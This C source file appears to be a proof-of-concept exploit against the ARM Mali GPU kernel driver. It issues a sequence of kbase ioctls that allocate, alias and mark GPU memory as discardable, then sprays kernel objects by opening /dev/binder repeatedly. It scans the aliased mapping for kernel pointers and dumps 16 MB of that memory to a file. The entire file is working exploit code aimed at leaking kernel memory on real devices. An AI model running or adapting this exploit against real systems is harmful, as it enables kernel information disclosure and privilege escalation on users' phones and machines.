#include <stdio.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define PAGE_SHIFT 12
#define ALLOC_SIZE (64UL << 20)

typedef uint32_t base_context_create_flags;
typedef uint32_t base_mem_alloc_flags;

struct kbase_ioctl_version_check {
    uint16_t major;
    uint16_t minor;
};

struct kbase_ioctl_set_flags {
    uint32_t create_flags;
};

union kbase_ioctl_mem_alloc {
    struct {
        uint64_t va_pages;
        uint64_t commit_pages;
        uint64_t extent;
        uint64_t flags;
    } in;
    struct {
        uint64_t flags;
        uint64_t gpu_va;
    } out;
};

union kbase_ioctl_mem_alias {
    struct {
        uint64_t flags;
        uint64_t stride;
        uint64_t nents;
        uint64_t aliasing_info;
    } in;
    struct {
        uint64_t flags;
        uint64_t gpu_va;
        uint64_t va_pages;
    } out;
};

struct base_mem_handle {
    struct {
        uint64_t handle;
    } basep;
};

struct base_mem_aliasing_info {
    struct base_mem_handle handle;
    uint64_t offset;
    uint64_t length;
};

struct kbase_ioctl_mem_flags_change {
    uint64_t gpu_va;
    uint64_t flags;
    uint64_t mask;
};

#define BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED ((base_context_create_flags)1 << 1)
#define BASEP_CONTEXT_MMU_GROUP_ID_SHIFT (3)
#define BASEP_CONTEXT_MMU_GROUP_ID_MASK ((base_context_create_flags)0xF << BASEP_CONTEXT_MMU_GROUP_ID_SHIFT)
#define BASEP_CONTEXT_CREATE_KERNEL_FLAGS (BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED | BASEP_CONTEXT_MMU_GROUP_ID_MASK)

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)

#define BASE_MEM_PROT_GPU_RD ((base_mem_alloc_flags)1 << 2)
#define BASE_MEM_PROT_GPU_WR ((base_mem_alloc_flags)1 << 3)
#define BASE_MEM_PROT_CPU_RD ((base_mem_alloc_flags)1 << 0)
#define BASE_MEM_PROT_CPU_WR ((base_mem_alloc_flags)1 << 1)

#define BASE_MEM_SAME_VA ((base_mem_alloc_flags)1 << 13)
#define BASE_MEM_DONT_NEED ((base_mem_alloc_flags)1 << 17)
#define BASE_MEM_COHERENT_SYSTEM ((base_mem_alloc_flags)1 << 10)
#define BASE_MEM_COHERENT_LOCAL ((base_mem_alloc_flags)1 << 11)

#define BASE_MEM_FLAGS_MODIFIABLE (BASE_MEM_DONT_NEED | BASE_MEM_COHERENT_SYSTEM | BASE_MEM_COHERENT_LOCAL)

#define KBASE_IOCTL_TYPE 0x80
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

static void err(const char *what) {
    fprintf(stderr, "[-] %s failed: %s (errno=%d)\n", what, strerror(errno), errno);
}

int main(void) {
    struct kbase_ioctl_version_check data = { .major = 999, .minor = 999 };
    int fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) { err("open /dev/mali0"); return 1; }

    if (ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &data) < 0) { err("VERSION_CHECK"); return 1; }
    printf("[+] kernel kbase API version: %u.%u\n", data.major, data.minor);

    struct kbase_ioctl_set_flags flags = { .create_flags = BASEP_CONTEXT_CREATE_KERNEL_FLAGS };
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &flags) < 0) { err("SET_FLAGS"); return 1; }
    printf("[+] SET_FLAGS ok\n");

    void *mem_area = mmap(NULL, ALLOC_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);
    if (mem_area == MAP_FAILED) { err("mmap tracking handle"); return 1; }
    printf("[+] tracking mmap: %p\n", mem_area);

    union kbase_ioctl_mem_alloc mem_alloc;
    memset(&mem_alloc, 0, sizeof(mem_alloc));
    mem_alloc.in.va_pages = ALLOC_SIZE >> PAGE_SHIFT;
    mem_alloc.in.commit_pages = ALLOC_SIZE >> PAGE_SHIFT;
    mem_alloc.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_WR;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &mem_alloc) < 0) { err("MEM_ALLOC"); return 1; }

    void *gpu_va = mmap(NULL, ALLOC_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, mem_alloc.out.gpu_va);
    if (gpu_va == MAP_FAILED) { err("mmap gpu_va"); return 1; }
    printf("[+] GPU_VA: %p (out.gpu_va=0x%llx)\n", gpu_va, (unsigned long long)mem_alloc.out.gpu_va);

    union kbase_ioctl_mem_alias mem_alias;
    memset(&mem_alias, 0, sizeof(mem_alias));
    mem_alias.in.nents = 1;
    mem_alias.in.stride = ALLOC_SIZE >> PAGE_SHIFT;
    mem_alias.in.flags = BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR | BASE_MEM_PROT_CPU_RD;

    struct base_mem_aliasing_info aliasing_info;
    memset(&aliasing_info, 0, sizeof(aliasing_info));
    aliasing_info.handle.basep.handle = (uint64_t)gpu_va;
    aliasing_info.offset = 0;
    aliasing_info.length = ALLOC_SIZE >> PAGE_SHIFT;
    mem_alias.in.aliasing_info = (uint64_t)&aliasing_info;

    if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &mem_alias) < 0) { err("MEM_ALIAS"); return 1; }
    printf("[+] MEM_ALIAS ok (gpu_va=0x%llx pages=%llu)\n", (unsigned long long)mem_alias.out.gpu_va, (unsigned long long)mem_alias.out.va_pages);

    struct kbase_ioctl_mem_flags_change flags_change;
    flags_change.gpu_va = (uint64_t)gpu_va;
    flags_change.mask = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    flags_change.flags = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &flags_change) < 0) { err("MEM_FLAGS_CHANGE"); return 1; }
    printf("[+] MEM_FLAGS_CHANGE ok\n");

    void *alias_va = mmap(NULL, ALLOC_SIZE, PROT_READ, MAP_SHARED, fd, mem_alias.out.gpu_va);
    if (alias_va == MAP_FAILED) { err("mmap alias_va"); return 1; }
    printf("[+] ALIAS_VA: %p\n", alias_va);

    int stat_fd = open("/proc/self/stat", O_RDONLY);
    (void)stat_fd;
    void *dummy = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (dummy != MAP_FAILED) memset(dummy, 0x41, 0x4000);

    int fds[2];
    (void)pipe(fds);
    for (int i = 0; i < 100; i++) open("/dev/binder", O_RDWR);

    printf("[*] scanning %lu MB alias mapping for kernel pointers...\n", ALLOC_SIZE >> 20);
    unsigned long found = 0;
    for (size_t i = 0; i < ALLOC_SIZE / 8; i++) {
        uint64_t v = *(uint64_t *)((char *)alias_va + i * 8);
        if ((v & 0xffffff8000000000ULL) == 0xffffff8000000000ULL) {
            if (found < 20) printf("    kernel ptr @%zu: 0x%016llx\n", i * 8, (unsigned long long)v);
            found++;
        }
    }
    printf("[%c] kernel-looking pointers: %lu\n", found ? '+' : '-', found);

    int dump_fd = open("./mali_dump.bin", O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (dump_fd >= 0) {
        ssize_t w = write(dump_fd, alias_va, 16 << 20);
        printf("[*] dumped %zd bytes to ./mali_dump.bin\n", w);
        close(dump_fd);
    }
    close(fd);
    return found ? 0 : 2;
}
